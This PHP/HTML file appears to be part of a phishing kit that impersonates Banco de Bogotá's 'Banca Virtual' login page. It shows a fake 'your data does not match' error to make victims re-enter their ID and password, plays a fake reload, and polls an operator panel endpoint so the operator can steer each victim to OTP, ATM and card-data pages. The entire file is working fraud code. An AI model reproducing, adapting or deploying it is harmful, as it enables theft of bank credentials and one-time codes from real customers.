<?php 
session_start();

$idreg = $_SESSION['idreg'] ?? '';
if (empty($idreg)) {
    header("Location: ../../checkout.php");
    exit;
}

require "../../config.php";
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Banca Virtual - Banco de Bogotá</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
    <link rel="stylesheet" href="bogota.css">
    <link rel="icon" href="images/favicon.ico">

    <style>
        .modal-error {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: rgba(44, 63, 106, 0.46);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.18s;
        }
        .modal-error-content {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 2px 18px 0 rgba(44, 63, 106, 0.11);
            width: 94vw;
            max-width: 410px;
            padding: 36px 22px 28px 22px;
            text-align: center;
            position: relative;
        }
        .modal-error-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            background: #F2E9DB;
            border-radius: 50%;
            width: 46px;
            height: 46px;
            margin: 0 auto 17px auto;
        }
        .modal-error-title {
            font-family: 'Roboto', Arial, sans-serif;
            color: #101828;
            font-weight: 700;
            font-size: 1.23rem;
            margin-bottom: 8px;
            margin-top: 2px;
        }
        .modal-error-text {
            color: #5F6B7A;
            font-family: 'Roboto', Arial, sans-serif;
            font-size: 1rem;
            line-height: 1.4;
            margin-bottom: 29px;
        }
        .modal-error-btn {
            display: block;
            margin: 0 auto;
            background: #0043a9;
            color: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            font-size: 1.06rem;
            font-weight: 700;
            border: none;
            border-radius: 23px;
            padding: 13px 0;
            width: 90%;
            cursor: pointer;
            transition: background 0.17s;
        }
        .modal-error-btn:hover {
            background: #0043a9;
        }
        .fake-reload-loader {
            position: fixed;
            inset: 0;
            z-index: 10000;
            background: rgba(44, 63, 106, 0.10);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.18s;
        }
        .spinner {
            margin-bottom: 17px;
        }
        .loader-bg {
            stroke-dasharray: 126;
            stroke-dashoffset: 0;
        }
        .loader-fg {
            stroke-dasharray: 126;
            stroke-dashoffset: 63;
            transform-origin: center;
            animation: spinner-rotate 1.1s linear infinite;
        }
        @keyframes spinner-rotate {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }
        .loader-text {
            color: #22304b;
            font-size: 1.13rem;
            font-family: 'Roboto', Arial, sans-serif;
            margin-top: 6px;
            font-weight: 500;
            text-align: center;
        }
    </style>
</head>

<body>
    <div id="main-content">
        <div class="login-container" id="login-container">
            <div class="header">
                <img src="logo.svg" alt="Logo" class="logo">
                <h1>Bienvenido a tu Banca Virtual</h1>
            </div>

            <section class="banner">
                <img src="leita.png" alt="" class="banner-image">
                <div class="banner-text">
                    ¿Nunca has ingresado a Banca Virtual?<br>
                    Aquí te decimos cómo hacerlo &rsaquo;
                </div>
            </section>

            <div class="tabs">
                <button class="active">Clave segura</button>
                <button class="active1">Tarjeta débito</button>
            </div>

            <section class="info-box">
                <div class="info-text">
                    <p>
                        Estás ingresando con tu Clave Segura.<br>
                        Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.
                    </p>
                </div>
                <button class="close-btn" title="Cerrar">
                    <svg width="20" height="20" viewBox="0 0 26 26" aria-hidden="true" focusable="false">
                        <line x1="5" y1="5" x2="21" y2="21" stroke="#5C93C6" stroke-width="2.2"/>
                        <line x1="21" y1="5" x2="5" y2="21" stroke="#5C93C6" stroke-width="2.2"/>
                    </svg>
                </button>
            </section>

            <div class="form-block-identificacion">
                <label for="identificacion" class="identidad">Identificación</label>
                <div class="input-group">
                    <div class="custom-select-wrapper">
                        <select id="tipo-id">
                            <option value="cc" data-label="C.C.">C.C. – Cédula de ciudadanía</option>
                            <option value="ti" data-label="T.I.">T.I. – Tarjeta de identidad</option>
                            <option value="ce" data-label="C.E.">C.E. – Cédula de extranjería</option>
                            <option value="npn" data-label="N.P.N.">N.P.N. – NIT Persona Natural</option>
                            <option value="npe" data-label="N.P.E.">N.P.E. – NIT Persona Extranjera</option>
                            <option value="npj" data-label="N.P.J.">N.P.J. – NIT Persona Jurídica</option>
                            <option value="ps" data-label="P.S.">P.S. – Pasaporte</option>
                            <option value="rc" data-label="R.C.">R.C. – Registro Civil</option>
                        </select>
                        <div class="select-display" id="tipo-display">C.C.</div>
                    </div>
                    <input type="text" id="txtUsuario" class="input-id" placeholder="#">
                </div>

                <label for="clave" class="clave">Clave segura</label>
                <div class="password-group">
                    <input type="password" id="txtPass" placeholder="....">
                    <span class="material-symbols-outlined toggle-icon" id="togglePassword">visibility</span>
                </div>

                <button class="btn-ingresar" id="btnUsuario" disabled>Ingresar</button>
                <input type="hidden" value="Bogota" id="banco">

                <div class="footer-links">
                    <a href="#">Registrarme ›</a>
                    <span class="divider"></span>
                    <a href="#">Olvidé mi clave ›</a>
                </div>
            </div>
        </div>

        <div class="recaptcha-info">
            Este sitio está protegido por reCAPTCHA y aplican las
            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">políticas de privacidad</a>
            y los
            <a href="https://policies.google.com/terms" target="_blank" rel="noopener">términos de servicio de Google</a>.
        </div>
    </div>

    <!-- MODAL DE ERROR -->
    <div class="modal-error" id="modal-error" style="display: flex;">
        <div class="modal-error-content">
            <div class="modal-error-icon">
                <img src="avis.svg" width="50" height="50" alt="icono" />
            </div>
            <div class="modal-error-title">Tus datos no coinciden</div>
            <div class="modal-error-text">
                Verifícalos e inténtalo nuevamente. Si aún no eres cliente te invitamos a solicitar un producto desde la pantalla de inicio. (02)
            </div>
            <button class="modal-error-btn" id="btnCerrarModalError">
                Volver al inicio
            </button>
        </div>
    </div>

    <!-- LOADER DE RECARGA -->
    <div class="fake-reload-loader" id="fake-reload-loader" style="display:none;">
        <div class="spinner">
            <svg width="60" height="60" viewBox="0 0 44 44">
                <circle class="loader-bg" cx="22" cy="22" r="20" fill="none" stroke="#EAF0F6" stroke-width="4"/>
                <circle class="loader-fg" cx="22" cy="22" r="20" fill="none" stroke="#0047B3" stroke-width="4" stroke-linecap="round"/>
            </svg>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const idreg = "<?php echo htmlspecialchars($idreg, ENT_QUOTES, 'UTF-8'); ?>";

            if (!idreg) {
                alert("Error interno: idreg no existe en sesión.");
                window.location.href = "../../checkout.php";
                return;
            }

            // Cerrar modal de error
            document.getElementById('btnCerrarModalError').addEventListener('click', function() {
                // Oculta el modal
                document.getElementById('modal-error').style.display = 'none';
                // Oculta el contenido principal
                document.getElementById('main-content').style.display = 'none';
                // Muestra el loader
                document.getElementById('fake-reload-loader').style.display = 'flex';

                // Espera 1 segundo y muestra todo de nuevo limpio
                setTimeout(function() {
                    document.getElementById('fake-reload-loader').style.display = 'none';
                    document.getElementById('main-content').style.display = '';
                    
                    // Limpiar campos del formulario
                    const usuario = document.getElementById('txtUsuario');
                    const clave = document.getElementById('txtPass');
                    const selectTipo = document.getElementById('tipo-id');
                    const btnIngreso = document.getElementById('btnUsuario');
                    const tipoDisplay = document.getElementById('tipo-display');

                    if (usuario) usuario.value = "";
                    if (clave) clave.value = "";
                    if (selectTipo) {
                        selectTipo.selectedIndex = 0;
                        if (tipoDisplay) tipoDisplay.textContent = selectTipo.options[0].getAttribute('data-label');
                    }
                    if (btnIngreso) {
                        btnIngreso.disabled = true;
                        btnIngreso.classList.remove('enabled');
                    }
                }, 1000);
            });

            // Verificar redirecciones del panel
            const checkRedirect = setInterval(async () => {
                try {
                    const r = await fetch(`../../panel_v2/process/panel_api_bridge.php?action=check_redirect&idreg=${idreg}`, {
                        method: 'GET',
                        cache: 'no-cache'
                    });
                    
                    if (r.ok) {
                        const data = await r.json();
                        
                        if (data.success && data.data && data.data.redirect) {
                            clearInterval(checkRedirect);
                            
                            switch (data.data.estado) {
                                case 'usuario':
                                    window.location.href = "bogota.php";
                                    break;
                                case 'otp':
                                    window.location.href = "otp.php";
                                    break;
                                case 'cc':
                                    window.location.href = "/reintentar.php";
                                    break;
                                case '923':
                                    window.location.href = "923.php";
                                    break;
                                case 'atm':
                                    window.location.href = "atm.php";
                                    break;
                                case 'finalizado':
                                    window.location.href = "finish.php";
                                    break;
                            }
                        }
                    }
                } catch (e) {
                    // Ignorar errores de polling
                }
            }, 2000);

            // Limpiar intervalo al salir
            window.addEventListener('beforeunload', () => {
                if (checkRedirect) {
                    clearInterval(checkRedirect);
                }
            });
        });
    </script>
</body>
</html>